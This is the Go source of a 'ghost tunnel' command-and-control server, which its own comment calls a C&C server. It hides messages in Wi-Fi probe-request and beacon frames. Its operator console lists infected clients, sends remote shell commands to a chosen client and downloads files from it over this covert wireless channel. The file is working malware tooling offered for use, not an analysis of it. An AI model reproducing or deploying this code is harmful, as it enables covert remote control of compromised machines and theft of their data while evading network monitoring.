package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	iconv "gopkg.in/iconv.v1"
)

var err error

// GTServer is a C&C server,
// handles probe-req and send beacon.
type GTServer struct {
	serverID    uint8
	iface       string
	handle      *pcap.Handle
	pr          *tunnelData
	bcn         *tunnelData
	curCltID    uint8
	curOptCltID uint8
	curCltACP   string
	clients     map[string]*clientSession
	file        dlFile
}

type clientSession struct {
	id            uint8
	name          string
	mac           string
	system        string
	rSeq          uint8
	wSeq          uint8
	connected     bool
	lastHeartBeat time.Time
}

// tunnelData is the secret data hidden in probe-req and beacon.
type tunnelData struct {
	mac      string
	flag     uint8
	dataType uint8
	seq      uint8
	clientID uint8
	serverID uint8
	length   uint8
	payload  string
}

type dlFile struct {
	f        *os.File
	maxSize  int
	curSize  int
	filename string
}

func main() {
	iface := flag.String("iface", "", "interface")
	flag.Parse()

	server := New(*iface)
	server.Setup()
	server.Run()
}

// New returns a ghost tunnel server.
func New(device string) *GTServer {
	rand.Seed(time.Now().UnixNano())
	return &GTServer{
		serverID: uint8(rand.Intn(256)),
		iface:    device,
		curCltID: 0,
		clients:  make(map[string]*clientSession),
	}
}

// Setup wireless adapter
func (s *GTServer) Setup() {
}

// Run the server.
func (s *GTServer) Run() {
	fmt.Println("[*] Server ID:", s.serverID)
	s.handle, err = pcap.OpenLive(s.iface, 1024, true, 0)
	// s.handle, err = pcap.OpenOffline("../caps/wcc6.pcapng")
	if err != nil {
		log.Fatal(err)
	}
	defer s.handle.Close()

	// err = s.handle.SetBPFFilter("type mgt subtype probe-req")
	if err != nil {
		log.Fatal(err)
	}

	for {
		s.send(0, TunnelShellData, "12346578901234567890123456789012345678901234567890")
	}
	// packetSource := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
	// go func() {
	// 	for packet := range packetSource.Packets() {
	// 		s.handlePacket(packet)
	// 	}
	// }()

	// go s.checkClientsStatus()

	// s.handleConsole()
}

func (s *GTServer) sendServerHeartBeat() {
	for {
		time.Sleep(30 * time.Second)
		s.send(s.curOptCltID, TunnelConnHeartBeat, "")
	}
}

func (s *GTServer) handlePacket(packet gopacket.Packet) {
	if l1 := packet.Layer(layers.LayerTypeDot11); l1 != nil {
		dot11, _ := l1.(*layers.Dot11)

		if l2 := packet.Layer(layers.LayerTypeDot11MgmtProbeReq); l2 != nil {
			dot11pr, _ := l2.(*layers.Dot11MgmtProbeReq)

			if td := parseProbeReq(dot11pr); td != nil {
				s.pr = td
				s.pr.mac = dot11.Address2.String()

				if c := s.clients[s.pr.mac]; c != nil {
					if c.rSeq == s.pr.seq {
						// This msg has been received.
						return
					}
					if c.rSeq < s.pr.seq {
						c.rSeq = s.pr.seq
					}
				}

				switch s.pr.dataType & 0xF0 {
				case TunnelConn:
					s.handleConn()

				case TunnelShell:
					s.handleShell()

				case TunnelFile:
					s.handleFile()

				default:
					break
				}
			}
		}
	}
}

func (s *GTServer) handleConn() {
	switch s.pr.dataType {
	case TunnelConnClientReq:
		c := s.clients[s.pr.mac]
		if c == nil {
			s.curCltID++
			s.clients[s.pr.mac] = &clientSession{
				id:            s.curCltID,
				name:          s.pr.payload,
				mac:           s.pr.mac,
				rSeq:          s.pr.seq,
				wSeq:          0,
				connected:     true,
				lastHeartBeat: time.Now(),
			}
			fmt.Printf("\n[*] Client %d online, MAC: %s, Name: %s\nCmd->", s.curCltID, s.pr.mac, s.pr.payload)
			go s.send(s.curCltID, TunnelConnServerResp, s.pr.payload)
		} else if !c.connected {
			c.connected = true
			c.lastHeartBeat = time.Now()
			fmt.Printf("\nClient %d reconnected!\nCmd->", c.id)
			go s.send(c.id, TunnelConnServerResp, s.pr.payload)
		}

	case TunnelConnHeartBeat:
		if c := s.clients[s.pr.mac]; c != nil {
			c.connected = true
			c.lastHeartBeat = time.Now()
		}
	default:
		break
	}
}

func (s *GTServer) handleShell() {
	switch s.pr.dataType {
	case TunnelShellData:
		cd, err := iconv.Open("utf-8", s.curCltACP) // convert utf-8 to gbk
		if err != nil {
			fmt.Println(err)
			break
		}

		defer cd.Close()
		ret := cd.ConvString(s.pr.payload)
		if ret == "" {
			fmt.Println("[!] convert to utf-8 error, show raw data")
			fmt.Print(s.pr.payload)
			break
		}
		fmt.Print(ret)

	case TunnelShellACP:
		fmt.Printf("[*] Shell from Client %d is ready,\n", s.curOptCltID)

		s.curCltACP = fmt.Sprintf("CP%d", binary.LittleEndian.Uint32([]byte(s.pr.payload)))
		fmt.Println("[*] ACP", s.curCltACP)

	default:
		break
	}
}

func (s *GTServer) handleFile() {
	switch s.pr.dataType {
	case TunnelFileInfo:
		s.file.maxSize = int(binary.LittleEndian.Uint32([]byte(s.pr.payload)))
		fmt.Println("[*] File size:", s.file.maxSize)
		s.file.f, err = os.Create("./downloads/" + s.file.filename)
		if err != nil {
			fmt.Println(err)
		}

	case TunnelFileData:
		n, err := s.file.f.Write([]byte(s.pr.payload))
		if err != nil {
			fmt.Println(err)
		}
		s.file.curSize += n
		fmt.Fprintf(os.Stdout, "[*] downloading %.4f%%, %dbyte/s\r", float64(s.file.curSize)/float64(s.file.maxSize)*100, n)

	case TunnelFileEnd:
		fmt.Fprintln(os.Stdout, "\r")
		fmt.Println("[i*] File download finished")
		s.file.f.Close()
		s.send(s.curOptCltID, TunnelShellData, "")

	case TunnelFileError:
		fmt.Fprintln(os.Stdout, "\r")
		fmt.Println("\r[!] download file error")
		if s.file.f != nil {
			s.file.f.Close()
		}
		s.send(s.curOptCltID, TunnelShellData, "")

	default:
		break
	}
}

func (s *GTServer) checkClientsStatus() {
	for {
		for _, c := range s.clients {
			if time.Since(c.lastHeartBeat) > 30*time.Second {
				c.connected = false
			}
		}
	}
}

func (s *GTServer) send(clientID, dataType uint8, payload string) {
	// var client *clientSession
	// for _, c := range s.clients {
	// 	// client exists
	// 	if c.id == clientID {
	// 		client = c
	// 		break
	// 	}
	// 	fmt.Printf("[!] Client %d not found\n", clientID)
	// 	return
	// }

	// client.wSeq++
	s.bcn = &tunnelData{
		flag:     ValidtunnelData,
		dataType: dataType,
		seq:      0,
		clientID: clientID,
		serverID: s.serverID,
		length:   uint8(len(payload)),
		payload:  payload,
	}

	buf := createBeacon(s.bcn)

	// let the packets fly
	for i := 0; i < 2000; i++ {
		s.handle.WritePacketData(buf)
		time.Sleep(100 * time.Microsecond)
	}
}

func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *tunnelData {
	body := probeLayer.LayerContents()
	var p1, p2 string = "", ""
	if layers.Dot11InformationElementID(body[0]) != layers.Dot11InformationElementIDSSID {
		return nil
	}
	if body[1] > 0 { // length>0
		ssid := body[2 : 2+body[1]]
		if ssid[0] != ValidtunnelData {
			return nil
		}
		t := &tunnelData{
			flag:     ssid[0],
			dataType: ssid[1],
			seq:      ssid[2],
			clientID: ssid[3],
			serverID: ssid[4],
			length:   ssid[5],
		}

		p1 = string(ssid[6 : 6+t.length])

		if (t.dataType & DataInVendor) != 0 {
			t.dataType &= ^DataInVendor
			for i := uint64(6 + t.length); i < uint64(len(body)); i++ {
				if layers.Dot11InformationElementID(body[i]) == layers.Dot11InformationElementIDVendor {
					// only save the last vendor specific field
					p2 = string(body[i+2:])
				}
			}
		}
		t.payload = p1 + p2
		return t
	}
	return nil
}

func createBeacon(t *tunnelData) []byte {
	buf := gopacket.NewSerializeBuffer()
	var p1, p2 string
	p1 = t.payload
	p2 = ""

	vendor := len(t.payload) > 26 // 32-2-6
	if vendor {
		t.length = 0xAE
		t.dataType |= DataInVendor
		p1 = t.payload[0:26]
		p2 = t.payload[26:]
	}

	ssid := []byte{t.flag, t.dataType, t.seq, t.clientID, t.serverID, t.length}
	ssid = append(ssid, []byte(p1)...)

	stack := []gopacket.SerializableLayer{
		&layers.RadioTap{
			DBMAntennaSignal: int8(-10),
			ChannelFrequency: 2562, // (11-1)*50+2512
		},
		&layers.Dot11{
			Address1:       broadcastHw,
			Address2:       customMAC,
			Address3:       customMAC,
			Type:           layers.Dot11TypeMgmtBeacon,
			SequenceNumber: uint16(t.seq),
		},
		&layers.Dot11MgmtBeacon{
			Flags:    uint16(openFlags),
			Interval: 100,
		},
		dot11Info(layers.Dot11InformationElementIDSSID, ssid),
		dot11Info(layers.Dot11InformationElementIDRates, supportedRates),
		dot11Info(layers.Dot11InformationElementIDDSSet, defaultChannel),
		dot11Info(layers.Dot11InformationElementIDTIM, defaultTIM),
		dot11Info(layers.Dot11InformationElementIDERPInfo, defaultERP),
		dot11Info(layers.Dot11InformationElementIDESRates, extendSupportRates),
		dot11Info(layers.Dot11InformationElementIDVendor, defaultVendor),
	}

	if vendor {
		stack = append(stack, dot11Info(layers.Dot11InformationElementIDVendor, []byte(p2)))
	}

	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}, stack...)

	return buf.Bytes()
}

func dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11InformationElement {
	return &layers.Dot11InformationElement{
		ID:     id,
		Length: uint8(len(info) & 0xff),
		Info:   info,
	}
}

func (s *GTServer) handleConsole() {
	stdin := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("Cmd-> ")
		var cmd string
		var param string

		input, _ := stdin.ReadString('\n')
		fmt.Sscan(input, &cmd, &param)

		switch cmd {
		case "sessions":
			s.showSessions()

		case "interact":
			id, err := strconv.Atoi(param)
			if err != nil {
				fmt.Println("[!] Invalid client id")
				break
			}
			s.interact(uint8(id))

		case "help":
			s.showHelp()

		case "":
			break

		case "exit":
			os.Exit(0)

		default:
			fmt.Println("[!] I don't understand, you may want to see help")
		}
	}
}

func (s *GTServer) showSessions() {
	if len(s.clients) == 0 {
		fmt.Println("No clients now")
		return
	}
	fmt.Println("ID           MAC                   Name          Connected      LastHeartBeat-Time")
	for _, c := range s.clients {
		fmt.Printf("%-2d    %-20s   %-10s       %-5v            %v\n", c.id, c.mac, c.name, c.connected, c.lastHeartBeat.Format("15:04:05"))
	}
}

func (s *GTServer) showHelp() {
	fmt.Println("Commands:")
	fmt.Println("\tsessions: show all sessions")
	fmt.Println("\tinteract: interact with selected client, interact [client ID]")
	fmt.Println("\tdownload: download a file(<10MB) from the current client, download [filepath]")
	fmt.Println("\t  quit  : quit current client session")
	fmt.Println("\t  exit  : exit ghost tunnel server")
	fmt.Println("\t  help  : show this tip")
}

func (s *GTServer) interact(clientID uint8) {
	if len(s.clients) == 0 {
		fmt.Println("[!] No clients")
		return
	}
	for _, c := range s.clients {
		if c.id == clientID {
			break
		}
		fmt.Printf("[!] Client %d not found\n", clientID)
		return
	}

	s.curOptCltID = clientID
	go s.send(s.curOptCltID, TunnelShellInit, "")
	go s.sendServerHeartBeat()

	for {
		stdin := bufio.NewReader(os.Stdin)
		p, _, _ := stdin.ReadLine()
		payload := string(p)
		if payload == "quit" {
			go s.send(s.curOptCltID, TunnelShellQuit, "")
			for _, c := range s.clients {
				if c.id == clientID {
					c.connected = false
					break
				}
			}
			return
		}

		if len(payload) > 9 && payload[0:8] == "download" {
			s.file.filename = payload[9:]
			s.download(s.file.filename)
			continue
		}
		go s.send(s.curOptCltID, TunnelShellData, payload)
	}
}

func (s *GTServer) download(filepath string) {
	os.Mkdir("./downloads/", 0777)
	s.send(s.curOptCltID, TunnelFileGet, filepath)
	s.file.curSize = 0
}

// flags in tunnelData
const (
	ValidtunnelData uint8 = 0xFE
	DataInVendor    uint8 = 0x80
)

// data type - Tunnel Connection
const (
	TunnelConn uint8 = iota + 0x10
	TunnelConnClientReq
	TunnelConnServerResp
	TunnelConnHeartBeat
)

// data type - Tunnel Shell
const (
	TunnelShell uint8 = iota + 0x20
	TunnelShellInit
	TunnelShellACP
	TunnelShellData
	TunnelShellQuit
)

// data type - Tunnel File
const (
	TunnelFile uint8 = iota + 0x30
	TunnelFileGet
	TunnelFileInfo
	TunnelFileData
	TunnelFileEnd
	TunnelFileError
)

// Beacon options
var (
	broadcastHw        = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	customMAC          = []byte{0x00, 0x03, 0x93, 0x54, 0x00, 0x00}
	supportedRates     = []byte{0x82, 0x84, 0x8b, 0x96}
	extendSupportRates = []byte{0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}
	openFlags          = 1057
	defaultChannel     = []byte{0x0B}
	defaultTIM         = []byte{0x00, 0x01, 0x00, 0x00}
	defaultERP         = []byte{0x00}
	defaultVendor      = []byte{0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00}
)
